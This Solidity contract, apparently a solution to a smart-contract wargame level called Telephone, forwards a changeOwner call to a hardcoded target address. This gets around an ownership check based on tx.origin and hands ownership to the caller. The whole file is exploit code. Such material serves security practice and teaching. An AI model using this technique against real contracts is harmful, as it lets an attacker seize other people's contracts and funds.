// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.16;

contract Telephone {
    address constant TARGET = address(0xFE1E62f4617B23bB1612b778DeB320c91A690C5F);

    function changeOwner() external returns(bool) {
        (bool success, ) = TARGET.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
        return success;
    }
}